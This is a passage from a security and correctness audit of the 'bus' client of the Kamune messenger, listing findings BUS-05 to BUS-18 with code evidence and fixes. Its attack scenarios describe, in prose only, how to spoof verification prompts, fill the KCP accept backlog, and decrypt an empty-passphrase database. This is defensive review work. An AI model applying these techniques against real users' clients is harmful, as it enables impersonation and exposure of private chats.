**Recommendation.** Cap in-memory messages per live session (ring buffer, for example last 1000) in Go and in the sessionMessages store, and page older ones from the DB. Coalesce or debounce session-updated events and stop calling GetSessions per message. Rate-limit and coalesce notifications per session. Batch DB writes. Use a keyed, windowed list in ChatPanel and render the TUI viewport incrementally. Add a per-session receive rate limit and a configurable maximum message size that closes the session on abuse.

<details><summary>Evidence</summary>

```text
messaging.go:142-144: a.mu.Lock(); session.Messages = append(session.Messages, msg); session.LastActivity = time.Now()
messaging.go:157-163: if !isActive { ... a.SendNotification("New Message", preview) }
messaging.go:165-166: a.emitEvent("message-received", session.ID, msg); a.emitEvent("session-updated", session.ID)
App.svelte:247-249: EventsOn("session-updated", async (data) => { await loadSessions(); });
App.svelte:262-266:
  sessionMessages.update((m) => {
      const msgs = m[sessionID] || [];
      return { ...m, [sessionID]: [...msgs, msg] };
ChatPanel.svelte:254: {#each activeMsgs as [...]
```

</details>

#### BUS-05

**Listener-side relay reconnection only tracks the first relay token; sessions from share-card or generated tokens never re-register**

Severity: Medium · Category: correctness

Locations: `cmd/bus/network.go:117-149`, `cmd/bus/relay.go:379-441`, `cmd/bus/relay.go:151-160`, `cmd/bus/relay.go:79-87`, `cmd/bus/network.go:1084-1101`, `cmd/bus/network.go:425-463` and 2 more

relayReconnectLoop is started once per StartServer (network.go:149). At start it picks the last tokenTracker in a.relayTokens, which is the initial token, and only ever waits on that tracker's Dead channel. Tokens created later by GetShareInfo (one per Share dialog open, network.go:1085) or GenerateRelayToken get no monitor. Share-card tokens are the normal way to invite a peer. When the initial token expires unused, the expiry timer calls Stop, which closes dead because the token is not consumed. The loop then resolves the session ID through relaySessionID. That falls back to scanning a.relayTokens for a stamped entry. Consumed entries are deleted 4 s after Accept (app.go:945-960), and stampRelaySession runs only after the handshake and any verification prompt. So the scan usually finds nothing, and the loop logs "cold start required" and exits for good.

**Attack scenario.** Not adversarial; this is an availability defect. A user starts a relay server and shares the card, and the peer connects with the share-card token. The dialer stores the ECDH reconnect pool and, on a network drop, retries with those tokens (network.go:714-738). The listener never registers them, so all 10 attempts fail and the session ends. The documented ECDH reconnection does not work in the default share flow.

**Recommendation.** Run one monitor per accepted tracker: start a goroutine per tokenTracker on Accept, or have the loop select over all live trackers. Stamp the session ID on the tracker at Accept time or keep a tracker-to-session map, instead of relying on slice entries that are removed after 4 s. Do not exit the loop when an unconsumed token expires.

<details><summary>Evidence</summary>

```text
relay.go:391-396: "for i := len(a.relayTokens) - 1; i >= 0; i-- { if tt, ok := a.relayTokens[i].listener.(*tokenTracker); ok { currentDead = tt.Dead(); currentTracker = tt; break } }" runs once before the loop. relay.go:433-441: "sessionID := relaySessionID(currentTracker, a.relayTokens) ... if sessionID == "" { slog.Warn(... "cold start required" ...); return }". relay.go:155-157: the expiry AfterFunc calls t.Stop(), and Stop calls closeDead() when !consumed.
```

</details>

#### BUS-06

**P2P listener feeds broker NOTIFYs to kcp-go as new sessions and never punches toward the dialer; dialer NAT-kick is cancelled on return**

Severity: Medium · Category: correctness

Locations: `cmd/bus/p2plistener.go:22-28`, `cmd/bus/p2plistener.go:129-137`, `cmd/bus/p2plistener.go:148-154`, `cmd/bus/p2plistener_test.go:67-108`, `cmd/bus/broker.go:361-391`, `cmd/bus/network.go:569-578` and 3 more

After the initial REGISTER, the p2pListener hands its punch socket to kcp.ServeConn(nil, 0, 0, conn) and never reads the broker's NOTIFY(PEER_MATCHED). The bus comment says broker NOTIFYs 'are silently dropped by kcp-go (they're not valid KCP packets)'. In kcp-go v5.6.72 Listener.packetInput (sess.go:1155-1270), with block == nil any datagram of 24 bytes or more from an unknown address whose bytes 4-5 are not an FEC type becomes a new UDPSession and is queued for Accept. A 133-byte NOTIFY starts 'KBRK',0x01,0x03, so it creates a session with conv 0x4b52424b keyed to the broker address, which the kamune server accepts and holds until its 30 s handshake timeout. Second effect: the listener never learns the dialer's address and never sends a packet toward it. Only the dialer punches, so the path works only when the listener's NAT filtering is endpoint-independent; address- or port-dependent filtering (Linux conntrack routers) drops the dialer's KCP packets. On the dialer side, HolePunch starts sendNATKick under punchCtx with defer punchCancel(), so the burst its comment describes is cancelled when HolePunch returns, and it ignores its timeout argument, so "Hole-punch succeeded" is logged before any packet arrives (network.go:578). Third, neither p2pListener nor directP2PListener filters by source, so any UDP sender can open a KCP session and reach the kamune handshake. The existing test sends a 15-byte payload, which is dropped only because it is shorter than IKCP_OVERHEAD, so it passes for the wrong reason. The daemon has the same listener code.

**Attack scenario.** Trigger is normal P2P use: the listener behind a port-restricted NAT starts a p2p server and the dialer matches through the broker. The broker sends NOTIFY(PEER_MATCHED) to the listener's punch socket; kcp-go creates a bogus session to the broker and the server goroutine waits about 30 s on it. The listener never opens a mapping toward the dialer, so the dialer's SYN is filtered, the dial fails and the user falls back to the relay. Separately, any host that learns the punch port can send 24-byte datagrams from many source ports to fill the 128-slot accept backlog. Sandbox test TestRT_KCPListenerAcceptsNotifyAsSession: 'accepted bogus session conv=0x4b52424b'.

**Recommendation.** Read the punch socket in the application before handing packets to kcp-go: demultiplex packets from the broker address or with the KBRK magic, parse PEER_MATCHED, and send NAT kicks to the announced address. Wrap the conn in a net.PacketConn filter so only non-broker packets reach kcp.ServeConn, and accept KCP sessions only from addresses learned from a PEER_MATCHED (or the configured direct peer). Make the dialer's kick synchronous or long-lived and honour the timeout. Fix the comment in cmd/bus/p2plistener.go:24-28 and change the test to use a 24-byte or larger non-KCP payload and a real NOTIFY.

<details><summary>Evidence</summary>

```text
cmd/bus/p2plistener.go:26-27: 'Broker NOTIFYs that arrive on the same socket are silently dropped by kcp-go (they're not valid KCP packets)'
cmd/bus/p2plistener.go:132: kcpL, err := kcp.ServeConn(nil, 0, 0, conn)
kcp-go sess.go:1227-1234 (default case): if len(data) < IKCP_OVERHEAD { return }; hasConv = true; conv = binary.LittleEndian.Uint32(data)
sess.go:1265-1269: s = newUDPSession(...); l.sessions[addr.String()] = s; l.chAccepts <- s
cmd/bus/broker.go:378-391:
  punchCtx, punchCancel := context.WithCancel(ctx)
  defer punchCancel()
  go sendNATKick(punchCtx, punchConn, peerAddr)
  ...
  [...]
```

</details>

#### BUS-07

**Saved keychain passphrase is deleted on any storage open error, including a DB lock held by tui or daemon**

Severity: Medium · Category: correctness

Locations: `cmd/bus/app.go:371-411`, `cmd/bus/app.go:997-1011`, `pkg/storage/storage.go:126-134`, `internal/engine/bolt_store.go:49-56`, `cmd/tui/main.go:55-65`

ServiceStartup reads the passphrase from the OS keychain and calls storage.OpenStorage. If OpenStorage returns any error, the code assumes the passphrase is wrong, deletes the keychain entry and prompts. The empty-passphrase branch at app.go:390 does the same. OpenStorage fails for many reasons unrelated to the passphrase: bbolt's exclusive file lock times out after 5 s when another process (cmd/tui, cmd/daemon or a second bus) has the same DB open, the directory is not writable, the disk is full, or the file is on an unmounted volume. All clients default to ~/.config/kamune/db, so a concurrent open is a normal situation. The error is not inspected (for example AEAD/cipher failure versus bolt.ErrTimeout).

**Attack scenario.** Trigger is benign. A user saved a strong passphrase to the keychain and no longer remembers it. They leave the TUI or daemon running on the default DB and start bus. bolt.Open times out after 5 s, bus logs 'Keychain passphrase is invalid, clearing and prompting' and calls keyring.Delete. The only copy of the passphrase is gone, so the identity key, peers and history in the DB become unrecoverable. Any local process that can hold the lock briefly can cause the same deletion.

**Recommendation.** Delete the keychain entry only when the error is a cipher/authentication failure from extractCipher (export a sentinel such as storage.ErrWrongPassphrase). On lock timeouts and I/O errors keep the entry, show the error, and offer a retry. Never delete a secret automatically without asking the user.

<details><summary>Evidence</summary>

```text
app.go:393-411:
 case err == nil && passphrase != "":
   a.passphrase.Store([]byte(passphrase))
   store, storeErr := storage.OpenStorage(...)
   if storeErr == nil { ... return nil }
   a.passphrase.Store([]byte(nil))
   keyring.Delete(keychainService, keychainAccount(a.dbPath))
   a.addLogEntry("WARN", "Keychain passphrase is invalid, clearing and prompting")
bolt_store.go:49-55: boltOpts := &bolt.Options{Timeout: 5 * time.Second} ... db, err := bolt.Open(path, 0600, boltOpts); if err != nil { return nil, fmt.Errorf("open db: %w", err) }
```

</details>

#### BUS-08

**Server sessions are kept in a slice keyed by ID; after resumption SendMessage uses the stale dead transport**

Severity: Medium · Category: correctness

Locations: `cmd/bus/network.go:880-950`, `cmd/bus/network.go:1034-1044`, `cmd/bus/network.go:831-878`, `cmd/bus/messaging.go:22-30`, `cmd/bus/messaging.go:170-173`, `cmd/bus/app.go:1063-1081` and 3 more

A resumed session keeps its ID (server.go:294-296). bus serverHandler appends it to a.sessions without removing an entry with the same ID (network.go:928-930). SendMessage, GetSessionMessages and DisconnectSession take the first match, which is the old entry on a half-open transport. Transport.Send into the kernel buffer succeeds, so the message is stored and shown as sent but is lost. For bus, daemon and tui clients the overlap lasts up to about 30-40 s: both sides detect a silent drop through the same 30 s x3 keepalive, and the client resumes only on ErrConnClosed. A client that resumes faster widens the overlap to the server keepalive bound of about 100 s. In the normal case the old loop's removeSession removes the old entry first. If the user clicks Disconnect during the overlap, DisconnectSession removes the old entry, and the old loop's removeSession(ID) then removes the new entry. The new transport stays open with its receive loop running, but the session is missing from a.sessions.

**Attack scenario.** Trigger: a bus user runs a server, and a peer on Wi-Fi switches networks. The peer's client resumes, and both entries now exist on the bus server. Replies typed by the bus user go to the old transport. Transport.Send writes into the kernel buffer of a half-open TCP socket and returns success, so the message shows as sent and is stored in history, but it never arrives. This lasts until keepalive closes the old transport, which takes 3 failed pings at a 30 s interval. The UI also gets two session-new events for one ID.

**Recommendation.** Store sessions in a map[string]*liveSession, or in serverHandler and ConnectToServer replace any existing entry with the same ID (swap its Transport as reconnectSession does on the dialer side) and close the old transport. Make removeSession compare pointers like cmd/daemon/network.go:1538-1547 so the old loop cannot remove the new entry.

<details><summary>Evidence</summary>

```text
cmd/bus/network.go:928-930:
  a.mu.Lock()
  a.sessions = append(a.sessions, session)
  a.mu.Unlock()
cmd/bus/messaging.go:24-28:
  for _, s := range a.sessions {
    if s.ID == sessionID { session = s; break }
cmd/bus/network.go:1037-1040:
  for i, s := range a.sessions {
    if s.ID == sessionID {
      a.sessions = append(a.sessions[:i], a.sessions[i+1:]...)
server.go:285-287: opts := s.handshakeOpts; opts.sessionID = sessionID; t, err := acceptHandshake(ec, serde, opts)
cmd/daemon/network.go:1541-1545:
  current, ok := d.sessions[session.ID]
  if !ok || current != session { return [...]
```

</details>

#### BUS-09

**SetDBPath and SubmitPassphrase close the live Storage while the server, dialers and transports still use it**

Severity: Medium · Category: correctness

Locations: `cmd/bus/app.go:773-791`, `cmd/bus/app.go:997-1011`, `cmd/bus/app.go:328`, `cmd/bus/network.go:76`, `cmd/bus/network.go:228`, `cmd/bus/messaging.go:58` and 6 more

The Sidebar DB card ("Click to change") opens a dismissable PassphraseDialog at any time, including while a server and sessions are running. Submit calls SetDBPath (if the path changed) and SubmitPassphrase. Both call a.db.Close() and then a.store() opens a new *storage.Storage. kamune.Server, Dialer and every Transport keep the old pointer (network.go:228, server.go:60, transport.go:41, transport.go:221). After the close every bolt call on it fails with 'database not open'. The verifier's FindPeer fails (server.go:202), so known peers show as "Unknown Peer" in Quick and Strict. StorePeer fails, so accepted peers are not saved. handleResume's GetPeer fails, so resumption is rejected. persistEstablishedSession (server.go:226) and invalidateResumptionTokens fail and only log, so Transport.Close and receipt of RouteCloseTransport cannot clear resumption tokens, which breaks the SPEC 6.6 rule that explicit close invalidates tokens. Messages go through a.store() to the new handle; with a new path that DB has no sessions/&lt;id&gt;/chat bucket, so AddChatEntry returns 'namespace not found'. With a new path the sidebar and share card also show the new identity's fingerprint while the server still presents the old identity. The daemon blocks this case with storageBusy() (daemon.go:293). The bus has no such guard.

**Attack scenario.** A user with a running server and active chats clicks the Database Path card and presses Unlock with the same path and passphrase. From then on every reconnect by a trusted contact triggers an "Unknown Peer" prompt, which trains the user to accept unknown-peer prompts, and accepted peers are not saved. When the peer later closes a session gracefully, invalidateResumptionTokens fails, so the 20 resumption tokens stay valid on disk for 24 h. If the user picked another DB, every message raises history-save-failed, and peers comparing the shared emoji fingerprint see a mismatch with the key the server presents.

**Recommendation.** Mirror the daemon. Refuse SetDBPath and SubmitPassphrase while a.server, relay listeners or a.sessions are active, or stop the server and close sessions first with an explicit confirmation. Disable the DB card in the frontend while serverActive or sessions exist. Only close the old store after the new one opens and no component references it. Do not close a.db when the submitted passphrase targets the DB that is already open.

<details><summary>Evidence</summary>

```text
app.go:779-784 (SetDBPath)
	a.storeMu.Lock()
	if a.db != nil {
		a.db.Close()
		a.db = nil
	}
app.go:1000-1005 (SubmitPassphrase) same close; then store := a.store()
network.go:228
	svr, err := kamune.NewServer(addr, a.serverHandler, store, a.getVerifier(), opts...)
Sidebar.svelte:578: <div class="db-card" ... onclick={() => onChangeDBPath?.()} title="Click to change database path">
App.svelte:1680-1682
	onChangeDBPath={() => {
		showPassphraseDialog = true;
		passphraseDismissable = true;
PassphraseDialog.svelte:34-38: if (dbPath !== currentPath) { await SetDBPath(dbPath) } await [...]
```

</details>

#### BUS-10

**StopServer closes dialed sessions without cancelling reconnect, triggering resume dials and zombie sessions after stop**

Severity: Medium · Category: correctness

Locations: `cmd/bus/network.go:350-387`, `cmd/bus/messaging.go:89-94`, `cmd/bus/messaging.go:170-173`, `cmd/bus/messaging.go:262-307`, `cmd/bus/app.go:446-453`, `transport.go:84-88` and 3 more

a.sessions holds both server and dialed sessions. StopServer, which restartServer also calls on every verification mode change, copies them, sets a.sessions = nil and calls s.Transport.Close() on each, but never calls reconnectCancel or clears reconnectFn. The local close makes ReceivePayload return ErrConnClosed (transport.go:84-88), and receiveMessages treats that as an involuntary drop and calls reconnectSession. Attempt 0 runs with no context check, and later attempts only stop when reconnectCtx is cancelled, which StopServer never does. The bus's own ServiceShutdown cancels reconnectCancel first (app.go:446-449), and the daemon's stopServer calls s.stop(), which nils reconnectFn and cancels the context.

**Attack scenario.** Trigger: the user stops the server or changes the verification mode while a dialed TCP or relay session is open. If the CloseTransport frame was sent, the resume tokens were cleared, and the bus makes up to 10 resume dials to the peer over about 150 s, each a full TCP connect and HPKE exchange before PopList fails. StopServer also blocks for channelTimeout (5 s) per such session. If the CloseTransport send failed, for example because the link was already broken, the tokens survive and the resume succeeds. The result is a live session that is no longer in a.sessions: it receives messages, writes history and raises notifications, but the UI cannot show it, send on it or disconnect it until the app exits.

**Recommendation.** Add a liveSession.stop() helper like the daemon's: under session.mu, cancel reconnectCtx, set reconnectFn to nil and close keepAliveDone. Call it before Transport.Close in StopServer and DisconnectSession. In reconnectSession, check reconnectCtx.Err() before attempt 0, and after a successful dial check reconnectFn under the lock, as cmd/daemon/messaging.go:446-451 does. Consider not closing outgoing sessions when only the listener stops.

<details><summary>Evidence</summary>

```text
cmd/bus/network.go:366-377:
  sessions = append([]*liveSession(nil), a.sessions...)
  a.sessions = nil
  ...
  for _, s := range sessions {
    s.Transport.Close()
  }
cmd/bus/messaging.go:89-93:
  case errors.Is(err, kamune.ErrConnClosed):
    if session.reconnectFn != nil &&
      a.reconnectSession(session) {
messaging.go:269-284: for attempt := range maxAttempts { if attempt > 0 { select { ... case <-session.reconnectCtx.Done(): return false } } ... t, err := session.reconnectFn(session.ID)
cmd/bus/app.go:446-449 (ServiceShutdown does cancel):
  if s.reconnectCancel != nil { [...]
```

</details>

#### BUS-11

**StartServer ignores CancelStartServer and allows a second concurrent start, leaving an orphan server**

Severity: Medium · Category: concurrency

Locations: `cmd/bus/network.go:29-34`, `cmd/bus/network.go:59-74`, `cmd/bus/network.go:103-148`, `cmd/bus/network.go:123`, `cmd/bus/network.go:242-251`, `cmd/bus/network.go:271-305` and 6 more

In relay mode, bus StartServer does not honour CancelStartServer. listenRelayTracked is called with context.Background() (network.go:123), and startCancel == nil is only checked before that call and on its error path. A cancelled start therefore still goes on to NewServer and assigns a.server. Cancel also resets serverLoading in the frontend, so the user can press Start again. The second call passes the a.server == nil check and builds its own relay listener. Whichever call finishes last overwrites a.server, a.relayListeners and a.relayTokens. Lines 144-148 write them without a.mu, and the first call's deferred cleanupStart clears the second call's startCancel. StopServer closes only the latest server and multiListener. The other server keeps its relay registration until the token is consumed or expires (10 min by default), and its goroutines leak. The TCP and UDP variants do not apply: ServeWithTCP and ServeWithUDP (server.go:388-409) bind synchronously in NewServer.

**Attack scenario.** Trigger: a slow or unreachable relay. The user clicks Start, then Cancel; the status reads Cancelled. When the relay handshake later completes, the server starts anyway. If the user clicked Start again in the meantime, two servers end up running. StopServer closes only the server stored in a.server and the ml in a.relayListeners. The other server keeps its relay registration and keeps accepting sessions under the verifier after the user believes the server is stopped.

**Recommendation.** Mirror the daemon: hold a start mutex (or reject StartServer while startCancel is set) for the whole of StartServer and StopServer, pass ctx to listenRelayTracked, newP2PListener and the other blocking setup calls, check ctx.Err() before assigning a.server, and on cancellation close every listener created so far. Bind synchronously (net.Listen and ServeWithListener) so StartServer returns bind errors. Read s.Transport under session.mu in ServiceShutdown.

<details><summary>Evidence</summary>

```text
cmd/bus/network.go:29-34: a.mu.Lock(); if a.server != nil { ... return ... }; a.mu.Unlock()
cmd/bus/network.go:59-66:
  ctx, cancel := context.WithCancel(context.Background())
  a.mu.Lock()
  if a.startCancel != nil {
    a.startCancel()
  }
cmd/bus/network.go:123:
  listener, token, ttl, sessionTTL, err := listenRelayTracked(context.Background(), a, relayAddr, password, false, relayStaticToken)
cmd/bus/network.go:242-244:
  a.mu.Lock()
  a.pubKey = pubKey
  a.server = svr
network.go:277-285 (cleanup): a.mu.Lock() ... a.server = nil ...
app.go:453: [...]
```

</details>

#### BUS-12

**Bus offers one-click 'Use without password' while telling the user the database is encrypted at rest**

Severity: Medium · Category: ux-safety

Locations: `cmd/bus/frontend/src/lib/PassphraseDialog.svelte:45`, `cmd/bus/frontend/src/lib/PassphraseDialog.svelte:85`, `cmd/bus/frontend/src/lib/PassphraseDialog.svelte:148`, `cmd/bus/app.go:997`, `cmd/bus/app.go:373`, `internal/engine/bolt_store.go:140` and 4 more

SPEC 11.2 says no-passphrase mode collapses the key hierarchy, is for embedded and test use, and SHOULD NOT be used where the DB file may be exposed. Bus nonetheless shows a "Use without password" button. It submits an empty passphrase and saves "" to the keychain, while the same dialog says "The database is encrypted at rest." With an empty passphrase, the DEK can be derived from the file alone, so the identity key and history are effectively plaintext. No warning appears, and no flag marks such a DB. The bus README also says the passphrase is "Set via KAMUNE_DB_PASSPHRASE env var", but bus never reads that variable; its handler only returns a.passphrase. The tui behaves the same way: pressing Enter at the "Passphrase:" prompt silently creates or opens an empty-passphrase DB. Daemon submit_passphrase also accepts "".

**Attack scenario.** A user on a censored network picks "Use without password" because the dialog says the DB is encrypted. The laptop is later seized. The examiner reads derive-salt, wrapped-salt and wrapped-key, derives the KEK from the empty string, decrypts the DEK, and then decrypts the Ed25519 identity, the contact list and all chat history with no guessing at all.

**Recommendation.** Remove the button, or show an explicit warning when the passphrase is empty and change the dialog text to say the data is not protected. Store a flag in kamune-store that records no-passphrase mode, so the UI can show it and later offer to add a passphrase. Give the tui the same treatment: reject an empty passphrase unless the user confirms. Correct the README configuration row and the Security Notes.

<details><summary>Evidence</summary>

```text
PassphraseDialog.svelte:45-49:
  async function skipPassphrase() {
    passphrase = ''
    saveToKeychain = true
    await submit()
PassphraseDialog.svelte:84-85:
  Enter your database passphrase to unlock your identity and chat history.
  The database is encrypted at rest.
PassphraseDialog.svelte:148-149: <button ... onclick={skipPassphrase}> Use without password
app.go:384 logs "Loaded empty passphrase from keychain" and continues.
README.md:152 | Passphrase | none | Set via `KAMUNE_DB_PASSPHRASE` env var |
README.md:158 - Database is encrypted at rest
grep KAMUNE_DB_PASSPHRASE cmd/bus -> [...]
```

</details>

#### BUS-13

**Ctrl+2 switches to Auto-Accept with no security confirmation; accepted peers persist as trusted**

Severity: Medium · Category: ux-safety

Locations: `cmd/bus/main.go:31`, `cmd/bus/main.go:56`, `cmd/bus/app.go:814`, `cmd/bus/verifier.go:151`

The Auto-Accept radio item has the accelerator CmdOrCtrl+2. SetVerificationMode asks for confirmation only when a server is running, and that dialog talks about restarting, not about disabling verification. With no server running there is no prompt at all. The Auto-Accept verifier stores every new key as a known peer (verifier.go:156-161). After the user switches back to Quick, those keys stay known and are auto-accepted without a dialog. The README calls Auto-Accept testing-only.

**Attack scenario.** A user presses Ctrl+2 by mistake (a common tab-switch shortcut) and does not notice the small status bar badge change. Any host that connects during that window is accepted without a prompt and written to the peer list. Later, in Quick mode, that host is still trusted and is never prompted.

**Recommendation.** Remove the accelerator from Auto-Accept, or require a confirmation that states that all peers will be accepted and stored. Do not persist peers accepted in Auto-Accept mode as known, or tag them so Quick mode still prompts. Show a persistent warning banner while Auto-Accept is active.

<details><summary>Evidence</summary>

```text
main.go:31-32:
  auto := verifSub.AddRadio("Auto-Accept", false).
      SetAccelerator("CmdOrCtrl+2")
main.go:56: auto.OnClick(func(_ *application.Context) { setVerifMode(2) })
app.go:820-833:
  serverRunning := a.server != nil
  ...
  if serverRunning {
      if !a.confirm("Restart Server?", "The verification mode change only applies to new client connections..."
verifier.go:155-161:
  _, err := store.FindPeer(key)
  if err != nil && !a.incognito {
      peer.FirstSeen = time.Now()
      if err := store.StorePeer(peer); err != nil {
```

</details>

#### BUS-14

**Inbound session steals focus; typed message is sent to the newly connected peer**

Severity: Medium · Category: ux-safety

Locations: `cmd/bus/frontend/src/App.svelte:230-233`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:14`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:91-96`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:272-280`, `cmd/bus/network.go:943`, `cmd/bus/messaging.go:145`

The session-new handler unconditionally sets activeSessionId to the new session, including sessions accepted by the server handler for inbound peers. ChatPanel keeps one messageText for all sessions, and handleSend reads $activeSessionId at send time. A message the user is typing for session A stays in the input after the switch and goes to session B on Enter. The handler also does not call SetActiveSession, so Go's activeSessionID still points at A, which breaks the notification suppression logic in messaging.go:145.

**Attack scenario.** A known peer (auto-accepted without prompt in default Quick mode) or any peer in Auto-Accept mode connects while the user is typing a sensitive reply to another contact. The active chat switches to the new peer, the partially typed text stays in the input, and pressing Enter sends the plaintext to the wrong peer. The attacker can reconnect repeatedly to raise the chance of a hit.

**Recommendation.** Do not change activeSessionId on session-new when a session is already active; show an unread badge or toast instead. Keep the draft per session (map keyed by session ID). When the active session changes programmatically, clear or stash the draft. Call SetActiveSession whenever activeSessionId changes.

<details><summary>Evidence</summary>

```text
App.svelte:230-233:
  EventsOn("session-new", async (data) => {
      await loadSessions();
      activeSessionId.set(data.id);
  });
ChatPanel.svelte:14: let messageText = $state('')
ChatPanel.svelte:91-95:
  function handleSend() {
    const text = messageText.trim()
    if (!text || !$activeSessionId) return
    onSendMessage?.({ sessionId: $activeSessionId, text })
network.go:943 (serverHandler, inbound): a.emitEvent("session-new", info)
```

</details>

#### BUS-15

**Single verification dialog is replaced by each new request, so unauthenticated peers can swap the prompt the user accepts**

Severity: Medium · Category: ux-safety

Locations: `cmd/bus/verifier.go:45-69`, `cmd/bus/verifier.go:107-145`, `cmd/bus/verifier.go:169-189`, `cmd/bus/verifier.go:191-214`, `cmd/bus/frontend/src/App.svelte:268-270`, `cmd/bus/frontend/src/App.svelte:885-889` and 6 more

Every inbound handshake in Strict mode, and every handshake from an unknown key in Quick mode, adds an entry to a.verifRequests and emits 'verify-peer'. The frontend keeps one store and calls verificationDialog.set(data), so each new request replaces the dialog shown. VerifyDialog is not keyed by requestID, so the same component re-renders in place with the new name, emoji and hex. Accept calls VerifyResponse(data.requestID, true) for whatever request is displayed at click time. The earlier request stays pending in Go until the 2 minute timeout and is never shown again. On timeout Go emits no event, so the dialog stays on screen and a later Accept is dropped ("Verification request not found" in the log only). Nothing limits the number of pending verifications or the prompt rate. Each one holds a server goroutine in awaitVerification for up to 2 minutes, even after the 30 s handshake deadline has killed the connection, and calls setStatus and addLogEntry with the attacker-supplied Name. The core accept loop has no connection cap. This verifier is reachable before any authentication by anyone who can reach a TCP or UDP listener.

**Attack scenario.** Default Quick mode. The user is comparing Alice's emoji fingerprint over the phone for a pending unknown-peer request. An unauthenticated host that can reach the server opens new handshakes with fresh Ed25519 keys and Name="Alice", every few hundred milliseconds or every 10-20 s. One arrives between the user's comparison and the click. The dialog content swaps under the cursor, the user clicks Accept, and the attacker's key is stored as a known peer (verifier.go:139-145), so it is auto-accepted on every later connection. Alice's request times out. At minimum, verification of legitimate peers is denied while the flood continues.

**Recommendation.** Queue verification requests in the frontend (array keyed by requestID) and show them one at a time. Wrap VerifyDialog in {#key data.requestID} and disable Accept for about 1 s after the content changes. Emit a verify-peer-cancelled event on timeout or when the connection dies, and remove that request from the queue. Cap pending verifications in Go (for example 3), reject new ones when the cap is reached, and rate-limit prompts per source address. Show the fingerprint more prominently than the peer-supplied name.

<details><summary>Evidence</summary>

```text
App.svelte:268-270:
 EventsOn("verify-peer", (data) => {
   verificationDialog.set(data);
 });
App.svelte:885-889:
  {#if $verificationDialog}
      <VerifyDialog data={$verificationDialog} onClose={() => verificationDialog.set(null)} />
VerifyDialog.svelte:6-7: async function accept() { await VerifyResponse(data.requestID, true) ... }
verifier.go:49-54: a.verifMu.Lock(); a.verifRequests[reqID] = &pendingVerification{...}; a.verifMu.Unlock()
verifier.go:56: a.setStatus(StatusVerifying, "Verifying fingerprint of "+peer.Name+"...")
verifier.go:169: const verificationTimeout = 2 * [...]
```

</details>

#### BUS-16

**Relay reconnect pool is never consumed and the reconnect loop context is never cancelled; token[0] is re-registered after stop or explicit close**

Severity: Medium · Category: spec-drift

Locations: `cmd/bus/relay.go:79-91`, `cmd/bus/relay.go:129-139`, `cmd/bus/relay.go:379-528`, `cmd/bus/network.go:59-74`, `cmd/bus/network.go:149`, `cmd/bus/network.go:350-381` and 4 more

relayReconnectLoop reloads the stored pool with loadRelayPool after every listener death and scans it from tokens[0]. It never marks or removes a used token. DisconnectSession clears only ResumptionTokensKey. No 7-day expiry check exists. As a result the listener re-registers token[0] after a graceful close, after DisconnectSession, after a failed resume, and after every token_ttl expiry of an unconsumed listener (Stop closes Dead when !consumed). Each cycle also appends an entry to a.relayTokens that is never pruned. The loop ctx is never cancelled, because cleanupStart nils startCancel without calling it and StopServer does not cancel it. Its only exit is the a.server==nil check after a 1-5 s backoff. On a quick restart, for example from SetVerificationMode, the old loop sees the new server. It registers each pooled token at the relay, fails ml.Add on the closed multiListener, closes the listener, and emits 'relay-pool-exhausted'. No frontend code listens for that event. The write at relay.go:512 is made without a.mu. The daemon has the same logic and uses d.ctx.

**Attack scenario.** After a peer disconnects, or the user disconnects the session, the bus keeps one fixed ECDH token registered at the relay indefinitely, re-registering it every token_ttl while the peer is offline. The relay operator, or an on-path observer of a ws/tcp relay leg, links these registrations across IP changes, which ECDH tokens were meant to prevent, and any holder of token[0] can JOIN the slot on a later cycle. After a verification mode change with an active relay session, the stale loop burns every pooled token and the UI reports the pool as exhausted.

**Recommendation.** Remove a token from the stored pool when it is registered (listener) or tried (dialer), and stop with a cold start when the pool is empty, as documented. Enforce the documented 7-day expiry. Clear RelayTokensKey on explicit close and skip re-registration when the session closed through RouteCloseTransport or DisconnectSession. Store the start context's cancel func for the server's lifetime and call it in StopServer and in the ListenAndServe cleanup. Write tt.sessionID under a.mu.

<details><summary>Evidence</summary>

```text
cmd/bus/relay.go:445:
  tokens, ok := loadRelayPool(st, sessionID)
cmd/bus/relay.go:469-474:
  for _, token := range tokens {
    listener, tokenHex, ttl, sessTTL, listenErr :=
      listenRelayTracked(
        ctx, a, relayAddr, password,
        false, token,
cmd/bus/network.go:853-854:
  if err := store.SetMeta(sessionID,
    storage.NewByteSlicesMeta(storage.ResumptionTokensKey, nil),
network.go:59: ctx, cancel := context.WithCancel(context.Background())
network.go:68-72: cleanupStart := func() { a.mu.Lock(); a.startCancel = nil; a.startCtx = nil; a.mu.Unlock() }
network.go:149: go [...]
```

</details>

#### BUS-17

**Direct-P2P listener accepts KCP sessions from any source, not only the configured peer address**

Severity: Low · Category: security

Locations: `cmd/bus/directp2p.go:16-19`, `cmd/bus/directp2p.go:59`, `cmd/bus/directp2p.go:95-101`, `cmd/bus/network.go:203-219`

newDirectP2PListener is documented as accepting KCP from a peer whose address is known upfront. It runs kcp.ServeConn on the punch socket and Accept returns any session from any source; peerAddr is used only for the NAT kick. Any host that can reach the bound port (public IP, full-cone NAT, or port forward) gets a Kamune handshake and, for an unknown key, a verification prompt. A session is granted without user action only in Auto-Accept mode. Exposure equals the normal UDP server, so this is a doc/expectation mismatch and a missing source filter.

**Attack scenario.** A user starts direct-P2P expecting only their friend's IP. A scanner or an on-path host sends a KCP SYN to the bound port, runs the handshake, and triggers verification prompts. In Auto-Accept mode, or with a known key in Quick mode, the scanner gets a session.

**Recommendation.** Wrap Accept to drop sessions whose RemoteAddr does not match peerAddr (IP, and port when known). Alternatively, filter packets by source address before they reach kcp-go.

#### BUS-18

**No Content Security Policy on the webview page that can call every bound App method**

Severity: Low · Category: security

Locations: `cmd/bus/frontend/index.html:3-13`, `cmd/bus/main.go:195-197`, `cmd/bus/app.go:773`, `cmd/bus/app.go:814`

The bus webview page has no Content Security Policy (no meta tag in index.html, no header from Wails AssetFileServerFS in v3.0.0-beta.23). The page renders peer-controlled names and messages and can call all 70 exported App methods. No HTML sink exists today. If one is added, injected script could call SetVerificationMode to switch to Auto-Accept or SetDBPath to point at another database. ExportLogsToFile and SaveCardPNG go through a native save dialog, so they do not give script a path write.

**Attack scenario.** If a future change or a dependency introduces an HTML sink for message or name text, injected script runs with full access to the Wails bindings and can, for example, switch verification to Auto-Accept or export logs to an arbitrary path. A CSP would block inline and remote script.

